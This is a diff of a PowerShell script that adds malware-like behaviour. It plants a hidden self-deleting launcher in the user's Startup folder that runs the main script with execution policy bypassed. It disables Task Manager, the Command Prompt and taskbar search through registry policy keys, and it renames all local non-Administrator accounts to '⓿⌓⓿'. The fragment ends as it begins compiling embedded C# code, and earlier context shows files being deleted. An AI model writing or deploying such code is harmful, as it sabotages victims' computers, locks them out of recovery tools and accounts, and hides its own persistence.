@@ -27,17 +27,49 @@ foreach ($path in $pathsToDelete) {
     }
 }
 
+# Create the launcher script content
+$launcherScriptContent = @"
+# Enable Command Prompt temporarily
+\$cmdRegistryPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
+Set-ItemProperty -Path \$cmdRegistryPath -Name "DisableCMD" -Value 0
+
+# Launch the main script
+\$mainScriptPath = "$PSCommandPath"
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"\$mainScriptPath`"" -WindowStyle Hidden
+
+# Disable Command Prompt again
+Set-ItemProperty -Path \$cmdRegistryPath -Name "DisableCMD" -Value 1
+
+# Delete the launcher script
+\$launcherScriptPath = \$MyInvocation.MyCommand.Path
+Remove-Item -Path \$launcherScriptPath -Force
+"@
+
+# Get the startup folder path
+$startupFolderPath = [Environment]::GetFolderPath("Startup")
+
+# Create the launcher script file
+$launcherScriptPath = Join-Path -Path $startupFolderPath -ChildPath "LauncherScript.ps1"
+$launcherScriptContent | Out-File -FilePath $launcherScriptPath -Force
+
 # Create registry key to disable Task Manager
 $disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
 New-Item -Path $disableTaskMgrPath -Force | Out-Null
 Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
 
-# Close all windows related to the Command Prompt
-$cmdProcesses = Get-Process -Name "cmd"
-foreach ($cmdProcess in $cmdProcesses) {
-    $cmdProcess.CloseMainWindow()
+# Create registry key to disable Search Bar in taskbar
+$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
+New-Item -Path $searchBarPath -Force | Out-Null
+Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
+
+# Rename user accounts to ⓿⌓⓿
+$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True' AND Name!='Administrator'"
+foreach ($user in $users) {
+    $newUsername = "⓿⌓⓿"
+    $user.Rename($newUsername)
 }
 
+# Compile and execute the C# code
 $source = @"
 using System;
 using System.Runtime.InteropServices;
